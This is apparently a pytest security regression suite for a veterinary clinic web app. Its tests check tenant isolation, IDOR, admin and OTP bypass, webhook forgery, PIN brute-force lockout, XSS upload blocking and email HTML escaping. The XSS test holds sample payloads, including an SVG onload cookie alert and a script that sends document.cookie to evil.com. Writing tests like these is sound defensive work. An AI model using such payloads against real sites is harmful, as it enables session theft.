import io
from datetime import datetime, timedelta
from unittest.mock import patch, MagicMock
import pytest

from app.core.models import Clinica
from app.clinic.models import Veterinario, Cliente, Mascota, Cita
from app.follow_up.models import MedicationPlan, DoseTracking
from app.core.security import create_access_token, hash_pin
from app.core.timezone import LIMA_TZ
from app.core.email import send_otp_email


def _create_vet(db_session, clinica_id: int, email: str, rol: str = "ADMIN"):
    vet = Veterinario(
        clinica_id=clinica_id,
        nombre=f"Dr. {email}",
        email=email,
        rol=rol,
        is_verified=True,
        is_active=True
    )
    db_session.add(vet)
    db_session.commit()
    token = create_access_token({
        "sub": str(vet.id),
        "clinica_id": clinica_id,
        "role": "vet",
        "rol": rol,
        "email": email
    })
    return vet, token


def test_vuln01_isolation_between_clinics_and_unauth_blocked(client, db_session):
    """
    VULN-01: Broken Access Control / Aislamiento Multi-Inquilino.
    - Sin autenticación, los endpoints clínicos retornan 401.
    - Un veterinario de la Clínica A no puede acceder, editar ni vincular pacientes/citas de la Clínica B,
      ni siquiera enviando `?atender_cita=1` o cambiando `clinica_id` en el body.
    """
    clinica_a = Clinica(nombre="Clínica A", zona_horaria="America/Lima", plan_activo="solo")
    clinica_b = Clinica(nombre="Clínica B", zona_horaria="America/Lima", plan_activo="solo")
    db_session.add_all([clinica_a, clinica_b])
    db_session.commit()

    _, token_a = _create_vet(db_session, clinica_a.id, "veta@clinica.com")
    _, token_b = _create_vet(db_session, clinica_b.id, "vetb@clinica.com")

    cliente_b = Cliente(clinica_id=clinica_b.id, dni="77889900", nombre_completo="Dueño B")
    db_session.add(cliente_b)
    db_session.commit()

    mascota_b = Mascota(clinica_id=clinica_b.id, cliente_id=cliente_b.id, nombre="SecretoB", especie="Canino")
    db_session.add(mascota_b)
    db_session.commit()

    # 1. Sin autenticación -> 401 en API
    resp_unauth = client.post("/api/clinic/pacientes", json={
        "clinica_id": clinica_a.id,
        "dni": "12345678",
        "mascota_nombre": "Hack",
        "mascota_especie": "Canino"
    })
    assert resp_unauth.status_code == 401

    # 2. Veterinario A intenta ver la ficha de mascota_b usando el antiguo bypass ?atender_cita=99
    client.cookies.set("vet_token", token_a)
    resp_idor_ficha = client.get(f"/pacientes/{mascota_b.id}?atender_cita=99")
    assert resp_idor_ficha.status_code == 404

    # 3. Veterinario A intenta registrar atención médica a mascota_b
    resp_idor_atencion = client.post("/api/clinic/atenciones", json={
        "clinica_id": clinica_b.id,
        "mascota_id": mascota_b.id,
        "tipo_atencion": "CONSULTA",
        "motivo": "Intento cross-tenant"
    })
    assert resp_idor_atencion.status_code in (403, 404)

    # 4. Veterinario A intenta resetear PIN del cliente de Clínica B
    resp_idor_pin = client.patch(f"/api/clinic/clientes/{cliente_b.id}/reset-pin")
    assert resp_idor_pin.status_code == 404


def test_vuln02_portal_bola_idor_and_query_param_bypass(client, db_session):
    """
    VULN-02: Fuga de Datos en el Portal de Dueños (BOLA/IDOR).
    - Pasar `?cliente_id=X` sin cookie JWT NO autentica al usuario.
    - Un dueño autenticado (Cliente A) NO puede ver el carnet, editar la mascota ni confirmar dosis de otro dueño (Cliente B).
    """
    clinica = Clinica(nombre="Clínica Portal", zona_horaria="America/Lima", plan_activo="solo")
    db_session.add(clinica)
    db_session.commit()

    cliente_a = Cliente(clinica_id=clinica.id, dni="11112222", nombre_completo="Cliente A")
    cliente_b = Cliente(clinica_id=clinica.id, dni="33334444", nombre_completo="Cliente B")
    db_session.add_all([cliente_a, cliente_b])
    db_session.commit()

    mascota_b = Mascota(clinica_id=clinica.id, cliente_id=cliente_b.id, nombre="MascotaDeB", especie="Felino")
    db_session.add(mascota_b)
    db_session.commit()

    # 1. Intentar entrar al dashboard pasando ?cliente_id= sin cookie
    resp_bypass = client.get(f"/portal/dashboard?cliente_id={cliente_b.id}", follow_redirects=False)
    assert resp_bypass.status_code == 303
    assert resp_bypass.headers["location"] == "/portal/login"

    # 2. Autenticado como Cliente A, intenta ver carnet de Mascota de B -> 403
    token_a = create_access_token({
        "sub": str(cliente_a.id),
        "role": "client",
        "dni": cliente_a.dni,
        "clinica_id": clinica.id
    })
    client.cookies.set("client_token", token_a)

    resp_carnet_b = client.get(f"/portal/carnet/{mascota_b.id}")
    assert resp_carnet_b.status_code == 403

    # 3. Autenticado como Cliente A, intenta modificar datos de Mascota de B -> 403
    resp_edit_b = client.post(f"/api/portal/mascotas/{mascota_b.id}", json={"sexo": "Macho"})
    assert resp_edit_b.status_code == 403


def test_vuln03_rogue_admin_and_otp_bypass_blocked(client, db_session):
    """
    VULN-03: Escalación de Privilegios en `/api/auth/vet/login`:
    - Si una clínica ya tiene un veterinario, nadie puede autocrearse como ADMIN en esa clínica.
    - Enviar `google_id` en el endpoint público no salta la verificación OTP.
    """
    clinica = Clinica(nombre="Clínica Segura", zona_horaria="America/Lima", plan_activo="solo")
    db_session.add(clinica)
    db_session.commit()

    vet_existente = Veterinario(
        clinica_id=clinica.id,
        nombre="Dr. Legítimo",
        email="legitimo@clinica.com",
        rol="ADMIN",
        is_verified=True,
        is_active=True
    )
    vet_no_verificado = Veterinario(
        clinica_id=clinica.id,
        nombre="Dr. Pendiente",
        email="pendiente@clinica.com",
        rol="VET",
        is_verified=False,
        is_active=True
    )
    db_session.add_all([vet_existente, vet_no_verificado])
    db_session.commit()

    # 1. Atacante intenta inyectarse como nuevo ADMIN en clinica existente
    resp_rogue = client.post("/api/auth/vet/login", json={
        "clinica_id": clinica.id,
        "nombre": "Atacante",
        "email": "hacker@evil.com",
        "google_id": "fake-google-id"
    })
    assert resp_rogue.status_code == 403

    # 2. Cuenta no verificada intenta saltar OTP enviando google_id
    resp_unverified = client.post("/api/auth/vet/login", json={
        "clinica_id": clinica.id,
        "nombre": "Dr. Pendiente",
        "email": "pendiente@clinica.com",
        "google_id": "fake-google-id"
    })
    assert resp_unverified.status_code == 403


def test_vuln04_webhook_forgery_and_subscription_bypass(client, db_session):
    """
    VULN-04: Bypass de Pagos (Webhook falso y Suscripción expirada en RENIEC).
    - Una clínica con trial expirado no puede consumir `/api/reniec/dni/{dni}` (retorna 402).
    - Enviar un POST falso a `/api/billing/webhook` sin firma válida cuando `MP_WEBHOOK_SECRET` está activo es rechazado con 401.
    - Enviar un `payment_id` inexistente a `/api/billing/webhook` no activa la clínica si Mercado Pago no confirma `approved`.
    """
    ahora = datetime.now(LIMA_TZ).replace(tzinfo=None)
    clinica_expirada = Clinica(
        nombre="Clínica Expirada",
        zona_horaria="America/Lima",
        plan_activo="solo",
        estado_suscripcion="trialing"
    )
    clinica_expirada.trial_ends_at = ahora - timedelta(days=2)
    db_session.add(clinica_expirada)
    db_session.commit()

    _, token_exp = _create_vet(db_session, clinica_expirada.id, "exp@clinica.com")
    client.cookies.set("vet_token", token_exp)

    # 1. Intento de usar RENIEC con suscripción vencida -> 402 Payment Required
    resp_reniec = client.get("/api/reniec/dni/12345678")
    assert resp_reniec.status_code == 402

    # 2. Intento de falsificar webhook con MP_WEBHOOK_SECRET configurado -> 401
    with patch("app.clinic.routes.settings.MP_WEBHOOK_SECRET", "super-secret-mp-key"):
        resp_forged = client.post("/api/billing/webhook/mercadopago", json={
            "type": "payment",
            "data": {"id": "999999"}
        })
        assert resp_forged.status_code == 401

    db_session.refresh(clinica_expirada)
    assert clinica_expirada.estado_suscripcion != "active"


def test_vuln05_pin_bruteforce_lockout(client, db_session):
    """
    VULN-05: Fuerza bruta contra el PIN de 4 dígitos y enumeración de DNI.
    - Tras 5 intentos fallidos de PIN para el mismo DNI, la cuenta queda bloqueada con HTTP 429,
      incluso si luego envía el PIN correcto.
    """
    clinica = Clinica(nombre="Clínica RateLimit", zona_horaria="America/Lima", plan_activo="solo")
    db_session.add(clinica)
    db_session.commit()

    cliente = Cliente(
        clinica_id=clinica.id,
        dni="55667788",
        nombre_completo="Paciente Protegido",
        pin_hash=hash_pin("4321")
    )
    db_session.add(cliente)
    db_session.commit()

    # Primeros 4 intentos fallidos -> 401, 5to intento -> 429 (activa bloqueo de 15 min)
    for i in range(4):
        r = client.post("/api/auth/client/login", json={
            "clinica_id": clinica.id,
            "dni": "55667788",
            "pin": f"000{i}"
        })
        assert r.status_code == 401

    r5 = client.post("/api/auth/client/login", json={
        "clinica_id": clinica.id,
        "dni": "55667788",
        "pin": "0004"
    })
    assert r5.status_code == 429

    # 6to intento (incluso con el PIN correcto "4321") -> sigue bloqueado con 429 Too Many Requests
    r_locked = client.post("/api/auth/client/login", json={
        "clinica_id": clinica.id,
        "dni": "55667788",
        "pin": "4321"
    })
    assert r_locked.status_code == 429


def test_vuln06_svg_xss_blocked_and_security_headers(client, test_clinica, db_session):
    """
    VULN-06 & VULN-07: Stored XSS vía archivos SVG/HTML y cabeceras de seguridad.
    - Subir un archivo `image/svg+xml` o un archivo con payload `<script>` camuflado como imagen es rechazado con 400.
    - Las respuestas incluyen `X-Content-Type-Options: nosniff` y `X-Frame-Options: DENY`.
    """
    _, token = _create_vet(db_session, test_clinica.id, "sec@clinica.com")
    client.cookies.set("vet_token", token)

    svg_xss = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>'
    files_svg = {"file": ("exploit.svg", io.BytesIO(svg_xss), "image/svg+xml")}
    resp_svg = client.post("/api/clinic/logo", files=files_svg, data={"clinica_id": str(test_clinica.id)})
    assert resp_svg.status_code == 400

    # Incluso camuflando el MIME como image/png pero con contenido <script>
    disguised_xss = b'<script>fetch("https://evil.com?c="+document.cookie)</script>'
    files_disguised = {"file": ("exploit.png", io.BytesIO(disguised_xss), "image/png")}
    resp_disguised = client.post("/api/clinic/logo", files=files_disguised, data={"clinica_id": str(test_clinica.id)})
    assert resp_disguised.status_code == 400

    # Verificar cabeceras de seguridad
    assert resp_svg.headers.get("X-Content-Type-Options") == "nosniff"
    assert resp_svg.headers.get("X-Frame-Options") == "DENY"


def test_vuln08_html_injection_escaped_in_emails():
    """
    VULN-08: Inyección HTML en correos transaccionales (Resend).
    Verifica que nombres con etiquetas `<script>` o `<a href=...>` se escapen con `html.escape`.
    """
    mock_resend = MagicMock()
    with patch("app.core.email.settings.RESEND_API_KEY", "re_mock_key"), \
         patch.dict("sys.modules", {"resend": mock_resend}):
        send_otp_email(
            destinatario="vet@clinica.com",
            otp_code="123456",
            nombre='Juan <script>alert(1)</script> <a href="http://phishing.com">Click</a>'
        )
        assert mock_resend.Emails.send.called
        sent_html = mock_resend.Emails.send.call_args[0][0]["html"]
        assert "<script>" not in sent_html
        assert "&lt;script&gt;" in sent_html
        assert '<a href="http://phishing.com">' not in sent_html

